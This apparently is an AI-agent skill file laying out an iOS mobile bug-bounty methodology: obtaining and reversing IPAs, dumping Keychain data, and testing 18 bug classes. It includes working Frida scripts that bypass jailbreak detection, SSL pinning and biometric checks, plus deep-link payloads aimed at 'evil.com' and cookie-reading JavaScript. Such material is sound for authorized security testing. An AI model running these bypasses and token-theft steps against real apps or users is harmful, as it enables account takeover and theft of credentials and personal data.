---
name: ios-security
description: Complete iOS mobile bug bounty — 18 bug classes (IPA reversing, Keychain misconfig, NSUserDefaults secrets, URL scheme hijacking, WKWebView exploitation, ATS bypass, pasteboard sniffing, binary protections, Frida/objection hooking, plist analysis, extension data sharing, biometric bypass, push notification exposure, Universal Links misconfig, custom keyboard leakage, IPC abuse, third-party SDK data collection, local auth framework bypass). Asset types — App Store, TestFlight, .ipa. Tools — class-dump, Hopper, otool, Frida, objection, ipatool.
---

# iOS BUG BOUNTY — 18 Bug Classes

Root cause, detection, exploitation, and real-world impact.

---

## ASSET ACQUISITION BY TYPE

### iOS: App Store
```bash
# Method 1: ipatool (CLI — download from App Store directly)
brew install ipatool
ipatool auth login -e your@apple.com     # Authenticate with Apple ID
ipatool download -b com.target.app -o target.ipa

# Method 2: Apple Configurator 2 (macOS)
# Add app to device via Apple Configurator → extracts IPA to ~/Library/Group Containers/

# Method 3: From jailbroken device
ssh root@DEVICE_IP
find /var/containers/Bundle/Application/ -name "*.app" | grep -i target
# Copy .app directory → zip as .ipa

# Method 4: 3uTools / iMazing (GUI tools)
# Connect device → Applications → Export IPA
```

### iOS: TestFlight
```bash
# TestFlight builds are beta versions — often have debug flags left on
# Key differences from App Store builds:
# - May have NSAllowsArbitraryLoads = true (for dev convenience)
# - May include debug logging / verbose error messages
# - May have test API keys / staging endpoints
# - May lack certificate pinning
# - May have allowBackup equivalents / weaker data protection

# Acquisition:
# 1. Join TestFlight beta (public link or invitation)
# 2. Install on device
# 3. Extract from jailbroken device (same as App Store method)

# TestFlight-specific checks:
# - Compare Info.plist between TestFlight and App Store builds
# - TestFlight builds expire after 90 days — test quickly
# - Check for beta-specific API endpoints (staging servers with weaker auth)
```

### iOS: .ipa (Direct IPA file)
```bash
# Already have the IPA — verify and extract
file target.ipa                    # Should show: Zip archive data
unzip -l target.ipa               # List contents

# Extract
unzip target.ipa -d target_extracted/
# Binary at: target_extracted/Payload/TargetApp.app/TargetApp

# If IPA is encrypted (App Store download)
# Use frida-ios-dump or clutch on jailbroken device to decrypt:
# Method 1: frida-ios-dump
python3 dump.py com.target.app    # Dumps decrypted IPA

# Method 2: clutch
clutch -d com.target.app

# Check encryption status
otool -l target_extracted/Payload/TargetApp.app/TargetApp | grep -A4 LC_ENCRYPTION_INFO
# cryptid 0 = decrypted, cryptid 1 = encrypted (need to decrypt first)
```

---

## SETUP

```bash
# Static analysis
brew install class-dump                    # Objective-C header dump
pip3 install frida-tools objection         # Runtime hooking
# Hopper Disassembler (commercial) or Ghidra (free) for binary analysis

# IPA acquisition
ipatool download -b com.target.app -o target.ipa  # From App Store (requires Apple ID)
# Or: use 3uTools / iMazing to extract from jailbroken device

# Reverse IPA
unzip target.ipa -d target_extracted/
# Binary at: target_extracted/Payload/TargetApp.app/TargetApp
class-dump target_extracted/Payload/TargetApp.app/TargetApp > headers.h
strings target_extracted/Payload/TargetApp.app/TargetApp > strings.txt
```

---

## 1. HARDCODED SECRETS & EMBEDDED CREDENTIALS

```bash
# String extraction
strings target_extracted/Payload/TargetApp.app/TargetApp | \
  grep -iE "api_key|secret|password|token|bearer|aws|firebase|AKIA|AIza"

# Plist secrets
plutil -p target_extracted/Payload/TargetApp.app/Info.plist
find target_extracted/ -name "*.plist" -exec plutil -p {} \; | \
  grep -iE "key|secret|token|password|api"

# Embedded certificates / private keys
find target_extracted/ -name "*.p12" -o -name "*.pem" -o -name "*.cer" -o -name "*.key"

# Firebase config
find target_extracted/ -name "GoogleService-Info.plist" -exec plutil -p {} \;
```

**Impact:** Same as Android — prove access, not just existence.

---

## 2. INSECURE DATA STORAGE

### Keychain (on jailbroken device)
```bash
# objection
objection -g com.target.app explore
ios keychain dump
# Look for: access control = kSecAttrAccessibleAlways (weakest)
# Tokens stored with kSecAttrAccessibleWhenUnlocked are safer
```

### NSUserDefaults (plaintext plist)
```bash
# On device
find /var/mobile/Containers/Data/Application/ -name "*.plist" -path "*Preferences*" | \
  xargs plutil -p 2>/dev/null | grep -iE "token|session|auth|password"

# objection
objection -g com.target.app explore
ios nsuserdefaults get
```

### SQLite & Core Data
```bash
find /var/mobile/Containers/Data/Application/APP_UUID/ -name "*.sqlite" -o -name "*.db"
sqlite3 found.db ".tables"
sqlite3 found.db "SELECT * FROM ZSESSION;"
```

### Cookies
```bash
# Cookies.binarycookies — check for sensitive session data
find /var/mobile/Containers/Data/Application/ -name "Cookies.binarycookies"
python3 BinaryCookieReader.py Cookies.binarycookies
```

---

## 3. URL SCHEME HIJACKING

```bash
# Enumerate schemes from Info.plist
plutil -p target_extracted/Payload/TargetApp.app/Info.plist | grep -A5 "CFBundleURLSchemes"

# Test scheme hijacking (another app registers same scheme)
# On device:
# Install malicious app that registers "targetapp://"
# When user clicks targetapp://oauth/callback?token=XXX → malicious app receives it
```

### Attack Patterns
```bash
# OAuth token theft via scheme hijack
# 1. Identify OAuth redirect: targetapp://oauth/callback
# 2. Create app with same scheme registered
# 3. User completes OAuth → token delivered to attacker app

# Deep link parameter injection
xcrun simctl openurl booted "targetapp://reset?token=ATTACKER_CONTROLLED"
xcrun simctl openurl booted "targetapp://webview?url=https://evil.com"
```

| Pattern | Impact |
|---|---|
| OAuth callback scheme not verified | ATO (Critical) |
| Sensitive deep link params | Token theft (High) |
| WebView URL injection via scheme | XSS / phishing (High) |

---

## 4. WKWEBVIEW EXPLOITATION

```bash
# Grep for dangerous WebView configurations
grep -rn "WKWebView\|UIWebView\|loadRequest\|loadHTMLString\|evaluateJavaScript" headers.h
grep -rn "allowsInlineMediaPlayback\|javaScriptEnabled" headers.h

# UIWebView (deprecated, but still found) = more attack surface than WKWebView
grep -rn "UIWebView" headers.h  # If present → older, less sandboxed
```

### Testing
```bash
# JavaScript injection via URL scheme
xcrun simctl openurl booted "targetapp://webview?url=javascript:alert(document.cookie)"

# Universal links vs custom schemes
# Check apple-app-site-association:
curl -s "https://target.com/.well-known/apple-app-site-association" | jq .
# Missing or misconfigured → scheme hijacking possible
```

---

## 5. APP TRANSPORT SECURITY (ATS) BYPASS

```bash
# Check Info.plist for ATS exceptions
plutil -p target_extracted/Payload/TargetApp.app/Info.plist | \
  grep -A10 "NSAppTransportSecurity"

# Critical findings:
# NSAllowsArbitraryLoads = true      → ALL HTTP allowed (bad)
# NSExceptionAllowsInsecureHTTPLoads → specific domain allows HTTP
# NSExceptionMinimumTLSVersion       → TLS 1.0 allowed (weak)
```

**Impact:**
```
NSAllowsArbitraryLoads = true     → MitM all traffic → High
Per-domain HTTP exception          → MitM that domain → Medium
TLS 1.0 allowed                    → Downgrade attack → Medium
```

---

## 6. PASTEBOARD / CLIPBOARD SNIFFING

```bash
# iOS 14+ shows clipboard access banner, but older versions don't
# Check if app copies sensitive data to clipboard
grep -rn "UIPasteboard\|generalPasteboard\|pasteboardWithName" headers.h

# objection monitoring
objection -g com.target.app explore
ios pasteboard monitor
# Trigger copy actions in app → see what goes to clipboard
```

**Impact:** Passwords/tokens copied to clipboard → any app reads them → Medium.

---

## 7. BINARY PROTECTIONS CHECK

```bash
# PIE (Position Independent Executable)
otool -hv target_extracted/Payload/TargetApp.app/TargetApp | grep PIE

# ARC (Automatic Reference Counting)
otool -Iv target_extracted/Payload/TargetApp.app/TargetApp | grep "_objc_release"

# Stack Canaries
otool -Iv target_extracted/Payload/TargetApp.app/TargetApp | grep "___stack_chk"

# Encryption check
otool -l target_extracted/Payload/TargetApp.app/TargetApp | grep -A4 LC_ENCRYPTION_INFO

# No PIE + No canaries + No ARC = binary exploitation possible
```

---

## 8. RUNTIME MANIPULATION (Frida/objection)

```bash
# Attach to running app
frida -U com.target.app

# objection full recon
objection -g com.target.app explore
ios info binary
ios plist cat Info.plist
ios cookies get
ios keychain dump
ios nsuserdefaults get
```

### Frida Bypass Scripts
```javascript
// Jailbreak detection bypass
ObjC.classes.DTTJailbreakDetection.isJailbroken.implementation = function() {
    return false;
};

// SSL pinning bypass (TrustKit/AlamoFire)
var TrustKit = ObjC.classes.TrustKit;
if (TrustKit) {
    Interceptor.attach(TrustKit['- evaluateTrust:forHostname:'].implementation, {
        onLeave: function(retval) { retval.replace(0); } // 0 = trusted
    });
}
```

---

## 9. THIRD-PARTY SDK VULNERABILITIES

```bash
# Find embedded frameworks
ls target_extracted/Payload/TargetApp.app/Frameworks/
# Common vulnerable SDKs: Firebase, Facebook, Adjust, AppsFlyer

# Check for outdated SDK versions
strings target_extracted/Payload/TargetApp.app/TargetApp | grep -iE "version.*[0-9]"

# Analytics SDK data leaks
# Some SDKs send PII to third-party servers — capture via proxy
```

---

## 10. SNAPSHOT / BACKGROUND SCREENSHOT LEAKAGE

```bash
# iOS takes screenshots when app backgrounds (for app switcher)
# Check if app implements screen protection
grep -rn "applicationDidEnterBackground\|willResignActive" headers.h
# If no overlay/blur implemented → sensitive screens visible in app switcher

# Find cached snapshots on device
find /var/mobile/Containers/Data/Application/APP_UUID/ -name "*.ktx" -o -name "*.png" | \
  grep -i snapshot
```

---

## 11. APP EXTENSION DATA SHARING

```bash
# Find app extensions
find target_extracted/ -name "*.appex" -type d
ls target_extracted/Payload/TargetApp.app/PlugIns/

# Check extension entitlements
codesign -d --entitlements - target_extracted/Payload/TargetApp.app/PlugIns/ShareExtension.appex

# App Group shared container
grep -rn "group\.\|appGroupIdentifier\|sharedContainerIdentifier" headers.h
# Shared containers can hold: UserDefaults, SQLite, files
# If sensitive data stored in shared container → any extension can read it
```

### Vulnerable patterns
```bash
# On jailbroken device — inspect shared container
find /var/mobile/Containers/Shared/AppGroup/ -name "*.plist" -exec plutil -p {} \;
find /var/mobile/Containers/Shared/AppGroup/ -name "*.sqlite" -exec sqlite3 {} ".tables" \;

# Check if auth tokens are stored in app group (shared across extensions)
# Extensions run in separate process with potentially weaker protections
```

| Scenario | Impact |
|---|---|
| Auth tokens in shared App Group container | Any extension reads tokens → High |
| Share Extension accesses full user data | Data exfil via share sheet → Medium |
| Keyboard Extension with network access + App Group data | Silent data exfil → High |
| Widget Extension displays sensitive data | Lock screen data exposure → Medium |

---

## 12. BIOMETRIC AUTHENTICATION BYPASS

```bash
# Check for LocalAuthentication framework usage
grep -rn "LAContext\|evaluatePolicy\|canEvaluatePolicy\|biometryType" headers.h
grep -rn "LAPolicyDeviceOwnerAuthenticationWithBiometrics\|LAPolicyDeviceOwnerAuthentication" headers.h

# Check if biometric check is local-only (no server verification)
# If app just checks LAContext.evaluatePolicy locally → bypass with Frida
```

**Frida bypass script:**
```javascript
// Bypass Face ID / Touch ID
var LAContext = ObjC.classes.LAContext;
LAContext['- evaluatePolicy:localizedReason:reply:'].implementation = function(policy, reason, reply) {
    console.log('[+] Biometric bypass — auto-approving');
    var callback = new ObjC.Block(reply);
    callback.invoke(true, null);  // true = success, null = no error
};

// Alternative — bypass canEvaluatePolicy (pretend biometrics available)
LAContext['- canEvaluatePolicy:error:'].implementation = function(policy, error) {
    return true;
};
```

**Server-side vs client-side biometric:**
```
CLIENT-SIDE ONLY (VULNERABLE):
1. User taps "Login with Face ID"
2. App calls LAContext.evaluatePolicy → returns true/false
3. If true → app shows dashboard (no server validation)
4. Frida bypass → always returns true → full access

SERVER-SIDE (SECURE):
1. User taps "Login with Face ID"
2. App calls LAContext → generates signed assertion with Secure Enclave
3. Signed assertion sent to server for verification
4. Server validates cryptographic proof → grants access
5. Frida bypass only fakes local check → server rejects
```

| Pattern | Impact |
|---|---|
| Client-only biometric check (no server validation) | Full auth bypass → Critical |
| Biometric protects sensitive action (transfer, view PII) | Action bypass → High |
| Biometric + fallback to weak PIN | PIN brute force instead → Medium |
| Biometric on already-authenticated session (re-auth) | Session action bypass → Medium |

---

## 13. PUSH NOTIFICATION DATA EXPOSURE

```bash
# Check how push notifications display sensitive data
grep -rn "UNUserNotificationCenter\|UNNotificationContent\|userNotificationCenter" headers.h
grep -rn "UNNotificationPresentationOptions\|willPresent\|didReceive" headers.h

# On device — check notification settings
# Settings → Notifications → Target App → Show Previews (Always/When Unlocked/Never)

# Check notification payload handling
grep -rn "userInfo\|aps\|alert\|body\|title" headers.h | grep -i notif
```

**Vulnerable patterns:**
```swift
// VULNERABLE — OTP in notification body (visible on lock screen)
let content = UNMutableNotificationContent()
content.title = "Verification Code"
content.body = "Your OTP is 483921"  // Visible to anyone looking at lock screen

// VULNERABLE — sensitive data in notification payload
// Push payload: {"aps": {"alert": {"body": "Transfer of $5,000 to John completed"}}}
// This is visible in notification center, lock screen, CarPlay, Apple Watch

// SECURE — notification service extension to modify content
// Use UNNotificationServiceExtension to:
// 1. Receive push with encrypted payload
// 2. Decrypt locally before display
// 3. Show generic text on lock screen, full content when unlocked
```

| Scenario | Impact |
|---|---|
| OTP/2FA codes in notification text | Lock screen readable → Medium |
| Financial transaction details visible | Privacy breach → Medium |
| Notification payload contains auth tokens | Token extraction → High |
| Rich notifications with sensitive images | Visual data leak → Medium |
| Silent push with sensitive data in userInfo | Logcat/syslog extraction → Medium |

---

## 14. UNIVERSAL LINKS MISCONFIGURATION

```bash
# Check apple-app-site-association (AASA) file
curl -s "https://target.com/.well-known/apple-app-site-association" | jq .
curl -s "https://target.com/apple-app-site-association" | jq .

# Validate AASA
# - Must be served over HTTPS (no redirects)
# - Content-Type: application/json
# - Must be signed by valid Apple-trusted CA
# - No wildcards in appID

# Check for misconfigured paths
# VULNERABLE: "paths": ["*"]           → captures ALL links
# VULNERABLE: "paths": ["/oauth/*"]    → can be hijacked if AASA invalid
# SECURE: "paths": ["/app/specific/*"] → narrowly scoped
```

**Attack scenarios:**
```bash
# Scenario 1: Missing AASA → custom URL scheme is only handler
# Result: scheme hijacking possible (another app registers same scheme)

# Scenario 2: AASA redirect chain
curl -sI "https://target.com/.well-known/apple-app-site-association"
# If response is 301/302 → AASA invalid → Universal Links won't work → falls back to scheme

# Scenario 3: AASA on wrong domain
# OAuth redirects to auth.target.com but AASA only on target.com
# Result: auth callbacks not caught by Universal Links → scheme hijack

# Scenario 4: Wildcard paths
# "paths": ["*"] → every link opens in app
# Combined with WebView that loads arbitrary URLs → full browser-in-app exploitation
```

| Misconfiguration | Impact |
|---|---|
| Missing AASA file entirely | Fallback to scheme hijacking → High |
| AASA served with redirect (invalid) | Universal Links disabled → scheme vulnerable → High |
| AASA on wrong domain (OAuth redirect) | OAuth token theft via scheme hijack → Critical |
| Overly broad path matching (`*`) | App opens all URLs → phishing surface → Medium |
| AASA not refreshed after domain change | Stale association → link interception → Medium |

---

## 15. CUSTOM KEYBOARD DATA LEAKAGE

```bash
# Check if app disables custom keyboards on sensitive fields
grep -rn "secureTextEntry\|isSecureTextEntry\|keyboardType" headers.h
grep -rn "shouldAllowExtensionPointIdentifier\|application.*extensionPointIdentifier" headers.h

# Check if app implements UIApplicationDelegate method to block keyboards
# application(_:shouldAllowExtensionPointIdentifier:) → "com.apple.keyboard-service"
```

**Vulnerable patterns:**
```swift
// VULNERABLE — no restriction on custom keyboards
// User installs malicious keyboard (e.g., from third-party)
// Keyboard has "Allow Full Access" → network access enabled
// Every keystroke on sensitive fields (password, CC#) → sent to attacker server

// SECURE — block custom keyboards on sensitive screens
func application(_ application: UIApplication,
    shouldAllowExtensionPointIdentifier identifier: UIApplication.ExtensionPointIdentifier) -> Bool {
    if identifier == .keyboard {
        return false  // Block all custom keyboards app-wide
    }
    return true
}

// SECURE — mark sensitive fields
passwordField.isSecureTextEntry = true  // Forces system keyboard
```

| Scenario | Impact |
|---|---|
| Password field allows custom keyboards | Credential keylogging → High |
| Credit card input allows custom keyboards | Financial data theft → High |
| No `shouldAllowExtensionPointIdentifier` implementation | All fields exposed → Medium |
| `isSecureTextEntry` not set on password fields | Password visible + keyboard logged → High |

---

## 16. IPC ABUSE (XPC / App Groups / Pasteboard)

```bash
# XPC Services (macOS/iOS)
find target_extracted/ -name "*.xpc" -type d
grep -rn "NSXPCConnection\|xpc_connection\|NSXPCInterface" headers.h

# Named Pasteboards (inter-app data sharing)
grep -rn "pasteboardWithName\|UIPasteboard\|generalPasteboard" headers.h

# App Group containers (shared data between app + extensions)
grep -rn "initWithSuiteName\|UserDefaults.*suiteName\|containerURL" headers.h
```

### XPC Service Exploitation
```bash
# XPC services with exported interfaces can be called by any process
# Check for authentication on XPC connections:
grep -rn "shouldAcceptNewConnection\|exportedInterface\|remoteObjectProxy" headers.h

# If XPC service performs privileged actions without verifying caller:
# - File operations with root privileges
# - Keychain access
# - Network requests with stored credentials
```

### Named Pasteboard Exploitation
```bash
# Named pasteboards persist across app launches
# If app stores tokens in named pasteboard:
# 1. Attacker app creates pasteboard with same name
# 2. Reads sensitive data without any permission

# Frida: enumerate pasteboards
frida -U com.target.app -e '
var pb = ObjC.classes.UIPasteboard;
console.log("General: " + pb.generalPasteboard().string());
'
```

| IPC Vector | Impact |
|---|---|
| XPC service with no caller verification | Privilege escalation → High |
| Named pasteboard with auth tokens | Token theft → High |
| App Group with plaintext credentials | Cross-extension credential theft → High |
| Shared Keychain group with weak access control | Inter-app secret access → Medium |

---

## 17. THIRD-PARTY SDK DATA COLLECTION

```bash
# Comprehensive SDK inventory
ls target_extracted/Payload/TargetApp.app/Frameworks/
strings target_extracted/Payload/TargetApp.app/TargetApp | grep -iE "sdk\|analytics\|tracker"

# Known problematic SDKs
# Facebook SDK — device fingerprinting, cross-app tracking
# Adjust — sends device data to third-party
# AppsFlyer — attribution data with PII
# Firebase — analytics events may contain PII
# Branch.io — deep link data with user info
# Crashlytics — crash reports may contain sensitive state

# Check Privacy Manifest (iOS 17+)
find target_extracted/ -name "PrivacyInfo.xcprivacy" -exec cat {} \;
# Required APIs that need declaration:
# - UserDefaults, file timestamp, system boot time, disk space
# If app uses these without declaring → App Store rejection risk

# Network traffic analysis (after SSL pinning bypass)
# Filter proxy logs for:
# - graph.facebook.com, api2.branch.io, app.adjust.com
# - Check what data is sent: IDFA, IDFV, email, location, IP
```

| Issue | Impact |
|---|---|
| SDK sending PII without consent | Privacy violation → Medium |
| SDK tracking across apps (deprecated IDFA access) | Tracking → Low (unless PII) |
| Crash report containing auth tokens | Token in third-party logs → High |
| SDK with known CVE (check version) | Depends on CVE → Medium–Critical |
| Missing Privacy Manifest (iOS 17+) | App Store compliance → Informational |

---

## 18. LOCAL AUTHENTICATION FRAMEWORK BYPASS

```bash
# Check for LAContext usage patterns
grep -rn "LAContext\|evaluatePolicy\|evaluateAccessControl" headers.h
grep -rn "SecAccessControl\|kSecAccessControlBiometry" headers.h

# Check if Keychain items are protected by biometric
grep -rn "kSecAttrAccessControl\|SecAccessControlCreateWithFlags" headers.h

# Difference from #12 (Biometric Bypass):
# This covers the broader Local Authentication framework including:
# - Device passcode fallback attacks
# - Keychain access control bypass
# - SecureEnclave credential protection
```

### Device Passcode Fallback Attack
```bash
# Many apps fall back from biometric → device passcode
# On test device, set simple passcode (1234)
# Biometric fails 5x → passcode prompt → brute force 4-digit PIN

# Check fallback policy
grep -rn "LAPolicyDeviceOwnerAuthentication" headers.h
# This policy falls back to passcode — not biometric-only
# vs LAPolicyDeviceOwnerAuthenticationWithBiometrics — biometric only
```

### Keychain Access Control Bypass
```javascript
// Frida: bypass Keychain biometric protection
Interceptor.attach(Module.findExportByName(null, 'SecItemCopyMatching'), {
    onEnter: function(args) {
        // Modify query to remove access control requirement
        var query = ObjC.Object(args[0]);
        console.log('[+] SecItemCopyMatching intercepted');
    },
    onLeave: function(retval) {
        console.log('[+] Result: ' + retval);
    }
});

// Alternative: remove Keychain ACL entirely
// 1. Dump Keychain items with objection
// 2. Identify items with kSecAttrAccessControl
// 3. Re-add same items without access control
```

| Pattern | Impact |
|---|---|
| LAPolicy falls back to device passcode | Weak passcode = auth bypass → Medium |
| Keychain items with `kSecAttrAccessibleAlways` | No device lock needed → High |
| No `kSecAttrAccessControl` on sensitive Keychain items | Bypass biometric requirement → High |
| `evaluatePolicy` success unlocks all features (no granular check) | Single bypass = full access → Critical |
| Secure Enclave key not used (software-only crypto) | Key extraction via jailbreak → Medium |

---

## iOS HUNTING CHECKLIST

```
[ ] IPA acquired (App Store / TestFlight / direct .ipa)
[ ] TestFlight build compared to production (debug flags, staging endpoints)
[ ] IPA decrypted if needed (frida-ios-dump / clutch)
[ ] Binary reversed (class-dump + strings)
[ ] Hardcoded secrets grepped + access tested
[ ] Info.plist reviewed (URL schemes, ATS, permissions)
[ ] Keychain dump — access control levels checked
[ ] NSUserDefaults inspected for plaintext secrets
[ ] URL schemes enumerated — hijacking tested
[ ] apple-app-site-association verified (no redirects, correct paths)
[ ] Universal Links properly configured (AASA on correct domain)
[ ] WKWebView/UIWebView configs checked
[ ] ATS exceptions reviewed
[ ] Clipboard monitoring during app use
[ ] Binary protections verified (PIE, canaries, ARC)
[ ] Jailbreak detection bypassed (if needed)
[ ] SSL pinning bypassed, traffic intercepted
[ ] Third-party SDK versions checked
[ ] Background screenshots checked for sensitive data
[ ] App Extensions audited (shared data, entitlements)
[ ] Biometric authentication tested (client-only vs server-validated)
[ ] Push notification content checked on lock screen
[ ] Custom keyboard restrictions verified
[ ] IPC mechanisms reviewed (XPC, App Groups, pasteboards)
[ ] SDK data collection audited via proxy
[ ] Local Authentication framework bypass tested
[ ] Privacy Manifest reviewed (iOS 17+)
```
